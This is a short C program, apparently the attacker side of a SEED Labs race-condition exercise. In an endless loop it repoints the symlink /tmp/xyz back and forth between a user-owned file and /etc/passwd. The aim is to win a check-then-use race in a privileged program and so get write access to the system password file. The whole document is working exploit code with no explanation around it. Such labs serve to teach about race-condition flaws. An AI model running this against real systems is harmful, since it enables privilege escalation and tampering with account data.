#include <unistd.h>

int main() {

	while(1) {

		unlink("/tmp/xyz");
		symlink("/home/seed/myfile", "/tmp/xyz");
		usleep(1000);
		unlink("/tmp/xyz");
		symlink("/etc/passwd", "/tmp/xyz");
		usleep(1000);
	
	}

	return 0;

}